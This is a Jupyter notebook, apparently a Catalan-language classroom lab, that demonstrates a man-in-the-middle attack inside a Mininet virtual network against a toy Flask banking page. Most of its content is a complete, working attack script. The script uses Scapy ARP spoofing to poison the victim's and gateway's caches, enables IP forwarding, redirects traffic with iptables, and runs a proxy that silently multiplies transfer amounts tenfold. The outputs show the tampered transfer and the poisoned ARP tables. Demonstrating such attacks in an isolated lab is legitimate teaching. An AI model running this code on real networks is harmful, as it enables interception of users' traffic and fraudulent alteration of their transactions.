In [115]:
import subprocess, time, os
from mininet.net import Mininet
from mininet.node import OVSSwitch
from mininet.link import TCLink
from mininet.log import setLogLevel

setLogLevel("info")

subprocess.run(["mn", "-c"], capture_output=True)
subprocess.run(["pkill", "-f", "banc.py"], capture_output=True)
subprocess.run(["pkill", "-f", "banco.py"], capture_output=True)
subprocess.run(["pkill", "-f", "mitm_attack.py"], capture_output=True)
subprocess.run(["fuser", "-k", "8000/tcp"], capture_output=True)

subprocess.run(["rm", "-f", "/tmp/mitm/banc.log"], capture_output=True)
subprocess.run(["rm", "-f", "/tmp/mitm/mitm.log"], capture_output=True)

time.sleep(2)

print("Netejat correctament ✅")

Netejat correctament ✅


In [116]:
os.makedirs('/tmp/mitm', exist_ok=True)

with open('/tmp/mitm/banco.py', 'w') as f:
    f.write('''
from flask import Flask, request
app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        importe = request.form.get("importe", "0")
        desti = request.form.get("desti", "")
    
        print(f"[BANCO] Transferencia: {importe} EUR a {desti}")
    
        with open("/tmp/mitm/banc.log", "a") as log:
            log.write(f"TRANSFERENCIA={importe}, DESTI={desti}\\n")
    
        return f"<h3 style=color:green>Transferencia realizada: {importe} EUR a {desti}</h3>"
    return """<!DOCTYPE html><html><head><meta charset=UTF-8><title>Banco Seguro</title>
<style>body{font-family:Arial;text-align:center;margin-top:50px;background:#f0f2f5}
.card{max-width:400px;margin:auto;background:white;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,.1)}
input,button{width:100%;padding:12px;margin:8px 0;border-radius:5px;box-sizing:border-box;border:1px solid #ccc}
button{background:#0066cc;color:white;border:none;font-size:16px;cursor:pointer}
</style></head><body><div class=card>
<h2>🏦 Banco Seguro</h2>
<form method=POST>
<input type=number name=importe placeholder="Importe en EUR" value=100 required>
<input type=text name=desti placeholder="IBAN Destino" value="ES80 2310 0001 1800 0001 2345" required>
<button type=submit>Realizar Transferencia</button>
</form></div></body></html>"""

app.run(host="0.0.0.0", port=8000, debug=False)
''')

with open('/tmp/mitm/mitm_attack.py', 'w') as f:
    f.write('''
import sys
sys.path.insert(0, "/usr/local/lib/python3.12/dist-packages")
from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr
import threading, time, os, urllib.parse, urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")

VICTIM_IP  = "10.0.0.2"
GATEWAY_IP = "10.0.0.1"
IFACE      = "h3-eth0"
REAL_PORT = 8000
PROXY_PORT = 8080
def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                 timeout=3, retry=2, iface=IFACE, verbose=0)
    return ans[0][1].hwsrc if ans else None

def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[MITM] No s'ha trobat MAC de {target_ip}")
        return

    my_mac = get_if_hwaddr(IFACE)

    pkt = Ether(dst=target_mac, src=my_mac) / ARP(
        op=2,
        pdst=target_ip,
        psrc=spoof_ip,
        hwdst=target_mac,
        hwsrc=my_mac
    )

    print(f"[MITM] ARP Spoof actiu: {target_ip} creu que {spoof_ip} = {my_mac}", flush=True)

    while True:
        sendp(pkt, verbose=0, iface=IFACE)
        time.sleep(1.5)

class ProxyHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args): pass

    def do_GET(self):
        try:
            resp = urllib.request.urlopen(f"http://{GATEWAY_IP}:{REAL_PORT}{self.path}")
            content = resp.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(content)
        except:
            self.send_response(502); self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(length).decode("utf-8")
        params = urllib.parse.parse_qs(post_data)

        if "importe" in params:
            original  = int(params.get("importe", ["0"])[0])
            desti     = params.get("desti", [""])[0]
            modificat = original * 10
            print("="*60)
            print("  TRANSFERENCIA INTERCEPTADA I MODIFICADA")
            print("="*60)
            print(f"  Client va enviar : {original} EUR")
            print(f"  Atacant canvia a : {modificat} EUR")
            print(f"  Desti            : {desti}")
            print("="*60)
            with open("/tmp/mitm/mitm.log", "a") as log:
                log.write(f"ORIGINAL={original}, MODIFICAT={modificat}, DESTI={desti}\\n")
            new_data = urllib.parse.urlencode({
                "importe": str(modificat),
                "desti": desti
            })
            req = urllib.request.Request(
                f"http://{GATEWAY_IP}:{REAL_PORT}/",
                data=new_data.encode(), method="POST"
            )
            resp = urllib.request.urlopen(req)
            content = resp.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(content)

def start_proxy():
    server = HTTPServer(("0.0.0.0", PROXY_PORT), ProxyHandler)
    print("[MITM] Proxy maliciós actiu al port 8080")
    server.serve_forever()

print("="*60)
print("  ATAC MITM - ARP SPOOFING + PROXY AMB SCAPY")
print("="*60)
threading.Thread(target=arp_spoof, args=(VICTIM_IP,  GATEWAY_IP), daemon=True).start()
threading.Thread(target=arp_spoof, args=(GATEWAY_IP, VICTIM_IP),  daemon=True).start()
time.sleep(2)
os.system("iptables -t nat -F")
os.system("iptables -t nat -A PREROUTING -i h3-eth0 -p tcp --dport 8000 -j REDIRECT --to-port 8080")
start_proxy()
''')

print("Scripts creats ✅")

Scripts creats ✅


In [113]:
net = Mininet(controller=None, switch=OVSSwitch, link=TCLink)

h1 = net.addHost("h1", ip="10.0.0.1/24", mac="00:00:00:00:00:01")
h2 = net.addHost("h2", ip="10.0.0.2/24", mac="00:00:00:00:00:02")
h3 = net.addHost("h3", ip="10.0.0.3/24", mac="00:00:00:00:00:03")

s1 = net.addSwitch("s1", failMode="standalone")

net.addLink(h1, s1, bw=10, delay="5ms")
net.addLink(h2, s1, bw=10, delay="5ms")
net.addLink(h3, s1, bw=10, delay="5ms")

net.start()

print("*** Ping test")
print(h1.cmd("ping -c1 10.0.0.2"))
print(h2.cmd("ping -c1 10.0.0.1"))
print(h2.cmd("ping -c1 10.0.0.3"))
print(h3.cmd("ping -c1 10.0.0.2"))

print("*** ARP tables before attack")
print("h1:")
print(h1.cmd("arp -n"))
print("h2:")
print(h2.cmd("arp -n"))
print("h3:")
print(h3.cmd("arp -n"))
print("*** Ping test")



(10.00Mbit 5ms delay) (10.00Mbit 5ms delay) (10.00Mbit 5ms delay) (10.00Mbit 5ms delay) (10.00Mbit 5ms delay) (10.00Mbit 5ms delay) *** Configuring hosts
h1 h2 h3 
*** Starting controller

*** Starting 1 switches
s1 (10.00Mbit 5ms delay) (10.00Mbit 5ms delay) (10.00Mbit 5ms delay) ...(10.00Mbit 5ms delay) (10.00Mbit 5ms delay) (10.00Mbit 5ms delay) 


*** Ping test
PING 10.0.0.2 (10.0.0.2) 56(84) bytes of data.
64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=41.0 ms

--- 10.0.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 41.046/41.046/41.046/0.000 ms

PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.
64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=20.1 ms

--- 10.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 20.126/20.126/20.126/0.000 ms

PING 10.0.0.3 (10.0.0.3) 56(84) bytes of data.
64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=43.9 ms

--- 10.0.0.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 43.858/43.858/43.858/0.000 ms

PING 10.0.0.2 (10.0.0.2) 56(84) bytes of data.
64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=20.1 ms

--- 10.0.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 20.112/20.112/20.

In [114]:
#- Iniciar servidor web
subprocess.run(["pkill", "-f", "banco.py"], capture_output=True)
subprocess.run(["fuser", "-k", "8000/tcp"], capture_output=True)
h1.cmd("pkill -f banco.py 2>/dev/null")
time.sleep(3)

import os
env = os.environ.copy()
env["PYTHONUNBUFFERED"] = "1"

# Flask en el HOST (para el navegador → 172.19.10.216:8000)
proc_banco = subprocess.Popen(
    ["python3", "/tmp/mitm/banco.py"],
    stdout=open("/tmp/mitm/banc.log", "w"),
    stderr=subprocess.STDOUT,
    env=env
)

# Flask en H1 (para el ataque MITM via curl de h2)
h1.cmd("cd /tmp/mitm && PYTHONUNBUFFERED=1 python3 banco.py > /tmp/mitm/banc_h1.log 2>&1 &")
time.sleep(2)

if proc_banco.poll() is None:
    print("Flask al host ✅ (navegador)")
    print("Flask a h1 ✅  (simulació MITM)")
    print("Obriu: http://172.19.10.216:8000")
    print("Poseu 100 EUR i premeu Realizar Transferencia")
else:
    print("❌ Flask al host no ha arrancat")

Flask al host ✅ (navegador)
Flask a h1 ✅  (simulació MITM)
Obriu: http://172.19.10.216:8000
Poseu 100 EUR i premeu Realizar Transferencia


In [88]:
h1.cmd("pkill -f banco.py 2>/dev/null")
h1.cmd("fuser -k 8000/tcp 2>/dev/null")

h1.cmd("python3 /tmp/mitm/banco.py > /tmp/mitm/banc.log 2>&1 &")
time.sleep(2)

print("Servidor banc iniciat dins h1 ✅")
print("Port 8000 dins h1:")
print(h1.cmd("ss -tlnp | grep 8000"))

print("Prova des de h2:")
print(h2.cmd("curl -s http://10.0.0.1:8000/ | head"))

Servidor banc iniciat dins h1 ✅
Port 8000 dins h1:
LISTEN 0      128          0.0.0.0:8000      0.0.0.0:*    users:(("python3",pid=97199,fd=3))

Prova des de h2:
<!DOCTYPE html><html><head><meta charset=UTF-8><title>Banco Seguro</title>
<style>body{font-family:Arial;text-align:center;margin-top:50px;background:#f0f2f5}
.card{max-width:400px;margin:auto;background:white;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,.1)}
input,button{width:100%;padding:12px;margin:8px 0;border-radius:5px;box-sizing:border-box;border:1px solid #ccc}
button{background:#0066cc;color:white;border:none;font-size:16px;cursor:pointer}
</style></head><body><div class=card>
<h2>🏦 Banco Seguro</h2>
<form method=POST>
<input type=number name=importe placeholder="Importe en EUR" value=100 required>
<input type=text name=desti placeholder="IBAN Destino" value="ES80 2310 0001 1800 0001 2345" required>



In [89]:
h3.cmd("pkill -f mitm_attack.py 2>/dev/null")
time.sleep(1)

h3.cmd("cd /tmp/mitm && python3 mitm_attack.py > /tmp/mitm/mitm.log 2>&1 &")
time.sleep(5)

In [90]:
print("Procesos en h3:")
print(h3.cmd("ps aux | grep mitm"))

print("Ficheros en /tmp/mitm:")
print(h3.cmd("ls -la /tmp/mitm"))

print("Contenido mitm.log:")
print(h3.cmd("cat /tmp/mitm/mitm.log 2>&1"))

Procesos en h3:
root       97199  1.7  1.5 114296 32016 pts/136  S+   18:31   0:00 python3 /tmp/mitm/banco.py
root       97207 11.3  3.8 381072 77196 pts/138  Sl+  18:31   0:00 python3 mitm_attack.py
root       97220  0.0  0.1   6544  2392 pts/138  S+   18:31   0:00 grep mitm

Ficheros en /tmp/mitm:
total 68
drwxr-xr-x  2 root root  4096 de maig  31 18:31 .
drwxrwxrwt 16 root root 12288 de maig  31 16:53 ..
-rw-r--r--  1 root root  1813 de maig  31 10:13 atacant.py
-rw-r--r--  1 root root   298 de maig  31 17:06 banc_h1.log
-rw-r--r--  1 root root   357 de maig  31 18:31 banc.log
-rw-r--r--  1 root root   305 de maig  31 10:14 banc_log.txt
-rw-r--r--  1 root root   573 de maig  31 10:37 banco.log
-rw-r--r--  1 root root  1409 de maig  31 18:31 banco.py
-rw-r--r--  1 root root   414 de maig  30 18:53 cliente.py
-rw-r--r--  1 root root   134 de maig  31 10:14 client_log.txt
-rw-r--r--  1 root root   954 de maig  31 10:13 client_receptor.py
-rw-r--r--  1 root root  3601 de maig  31 18:31 

In [91]:
print("ARP h2 després atac:")
print(h2.cmd("arp -n"))

print("ARP h1 després atac:")
print(h1.cmd("arp -n"))

ARP h2 després atac:
Address                  HWtype  HWaddress           Flags Mask            Iface
10.0.0.3                 ether   00:00:00:00:00:03   C                     h2-eth0
10.0.0.1                 ether   00:00:00:00:00:03   C                     h2-eth0

ARP h1 després atac:
Address                  HWtype  HWaddress           Flags Mask            Iface
10.0.0.3                 ether   00:00:00:00:00:03   C                     h1-eth0
10.0.0.2                 ether   00:00:00:00:00:03   C                     h1-eth0



In [92]:
time.sleep(1)
print("="*60)
print("  SENSE ATAC — Log del banc:")
print("="*60)
log = subprocess.run(["cat", "/tmp/mitm/banc.log"], capture_output=True, text=True).stdout
print(log if log.strip() else "(feu una transferencia al navegador primer)")

  SENSE ATAC — Log del banc:
 * Serving Flask app 'banco'
 * Debug mode: off
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://127.0.0.1:8000
Press CTRL+C to quit
10.0.0.2 - - [31/May/2026 18:31:36] "GET / HTTP/1.1" 200 -



In [93]:
resposta = h2.cmd(
    "curl -s -X POST http://10.0.0.1:8000/ -d 'importe=100&desti=ES987654321'"
)

print(resposta)

time.sleep(2)

print("LOG MITM:")
print(h3.cmd("cat /tmp/mitm/mitm.log"))

print("LOG BANC:")
print(h1.cmd("cat /tmp/mitm/banc.log"))

<h3 style=color:green>Transferencia realizada: 1000 EUR a ES987654321</h3>
LOG MITM:
  ATAC MITM - ARP SPOOFING + PROXY AMB SCAPY
[MITM] ARP Spoof actiu: 10.0.0.2 creu que 10.0.0.1 = 00:00:00:00:00:03
[MITM] ARP Spoof actiu: 10.0.0.1 creu que 10.0.0.2 = 00:00:00:00:00:03
ORIGINAL=100, MODIFICAT=1000, DESTI=ES987654321

LOG BANC:
 * Serving Flask app 'banco'
 * Debug mode: off
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://127.0.0.1:8000
Press CTRL+C to quit
10.0.0.2 - - [31/May/2026 18:31:36] "GET / HTTP/1.1" 200 -
10.0.0.3 - - [31/May/2026 18:31:59] "POST / HTTP/1.1" 200 -



In [94]:
h3.cmd("pkill -f mitm_attack.py 2>/dev/null")
time.sleep(1)
h3.cmd("cd /tmp/mitm && python3 mitm_attack.py > /tmp/mitm/mitm.log 2>&1 &")
time.sleep(5)

print("="*60)
print("  PAS 3 — ATACANT MITM ACTIU ⚠️")
print("="*60)
print("  Scapy enviant ARP falsos:")
print("  → h2 creu que 10.0.0.1 (banc) = MAC de h3")
print("  → Tot el traffic passa per h3")
print()
print("  >> Torneu al navegador i envieu una altra transferencia")
print("  >> El banc rebrà 1000 EUR en lloc de 100 EUR")

  PAS 3 — ATACANT MITM ACTIU ⚠️
  Scapy enviant ARP falsos:
  → h2 creu que 10.0.0.1 (banc) = MAC de h3
  → Tot el traffic passa per h3

  >> Torneu al navegador i envieu una altra transferencia
  >> El banc rebrà 1000 EUR en lloc de 100 EUR


In [95]:
# Afegiu aquesta cel·la entre el PAS 3 i el PAS 4
resposta = h2.cmd("curl -s -X POST http://10.0.0.1:8000/ -d 'importe=100&desti=ES987654321'")
print("[h2 CLIENT] Ha enviat 100 EUR, ha rebut:")
print(resposta)
time.sleep(2)
print("[ATACANT] Log:")
print(h3.cmd("cat /tmp/mitm/mitm.log"))

[h2 CLIENT] Ha enviat 100 EUR, ha rebut:
<h3 style=color:green>Transferencia realizada: 1000 EUR a ES987654321</h3>
[ATACANT] Log:
  ATAC MITM - ARP SPOOFING + PROXY AMB SCAPY
[MITM] ARP Spoof actiu: 10.0.0.2 creu que 10.0.0.1 = 00:00:00:00:00:03
[MITM] ARP Spoof actiu: 10.0.0.1 creu que 10.0.0.2 = 00:00:00:00:00:03
ORIGINAL=100, MODIFICAT=1000, DESTI=ES987654321



In [96]:
time.sleep(2)
print("="*60)
print("  AMB ATAC — Log del banc:")
print("="*60)
print(subprocess.run(["cat", "/tmp/mitm/banc.log"], capture_output=True, text=True).stdout)


  AMB ATAC — Log del banc:
 * Serving Flask app 'banco'
 * Debug mode: off
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://127.0.0.1:8000
Press CTRL+C to quit
10.0.0.2 - - [31/May/2026 18:31:36] "GET / HTTP/1.1" 200 -
10.0.0.3 - - [31/May/2026 18:31:59] "POST / HTTP/1.1" 200 -
10.0.0.3 - - [31/May/2026 18:32:22] "POST / HTTP/1.1" 200 -



In [97]:
print("="*60)
print("  TAULES ARP — PROVA FORENSE")
print("="*60)
print("[h1 - Banc]");    print(h1.cmd("arp -n"))
print("[h2 - Client]");  print(h2.cmd("arp -n"))
print("[h3 - Atacant]"); print(h3.cmd("arp -n"))
print()
print("OBSERVACIO: h2 te 10.0.0.1 (banc) associat a la MAC de h3 (atacant)")
print("=> ARP Spoofing confirmat!")

  TAULES ARP — PROVA FORENSE
[h1 - Banc]
Address                  HWtype  HWaddress           Flags Mask            Iface
10.0.0.3                 ether   00:00:00:00:00:03   C                     h1-eth0
10.0.0.2                 ether   00:00:00:00:00:03   C                     h1-eth0

[h2 - Client]
Address                  HWtype  HWaddress           Flags Mask            Iface
10.0.0.3                 ether   00:00:00:00:00:03   C                     h2-eth0
10.0.0.1                 ether   00:00:00:00:00:03   C                     h2-eth0

[h3 - Atacant]
Address                  HWtype  HWaddress           Flags Mask            Iface
10.0.0.1                 ether   00:00:00:00:00:01   C                     h3-eth0
10.0.0.2                 ether   00:00:00:00:00:02   C                     h3-eth0


OBSERVACIO: h2 te 10.0.0.1 (banc) associat a la MAC de h3 (atacant)
=> ARP Spoofing confirmat!


In [98]:
subprocess.run(["pkill", "-f", "banco.py"], capture_output=True)
subprocess.run(["fuser", "-k", "8000/tcp"], capture_output=True)
h3.cmd("pkill -f mitm_attack.py 2>/dev/null")
net.stop()
print("Xarxa aturada ✅")

*** Stopping 0 controllers

*** Stopping 3 links
...
*** Stopping 1 switches
s1 
*** Stopping 3 hosts
h1 h2 h3 
*** Done


Xarxa aturada ✅
